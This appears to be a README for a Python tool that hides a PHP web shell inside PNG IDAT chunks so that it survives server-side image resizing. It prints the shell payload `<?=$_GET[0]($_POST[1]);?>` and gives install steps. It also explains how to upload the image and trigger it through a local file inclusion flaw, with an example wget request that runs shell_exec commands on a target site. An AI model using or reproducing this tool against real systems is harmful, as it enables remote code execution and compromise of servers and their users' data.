# Web Shells in PNG IDAT chunks

This python script will create 2 png images, with differents formats (55x55 and 110x110), containing a php shell that will bypass the resizes php filters.

It is based on the work presented [on this blog](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

The server will react as if you had executed the following code:
```php
<?=$_GET[0]($_POST[1]);?>
```
## Installation

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install the packages needed.

```bash
pip install numpy, matplotlib
```


## Usage

Just launch the script and you will see 2 images in your directory. 
To send commands, you have to upload one one them and exploit a LFI to "execute" your image.

Example: 
```bash
wget "http://www.target.com/page.php?action=../upload/exploit_110.png&0=shell_exec"  --post-data "1=ls"
```
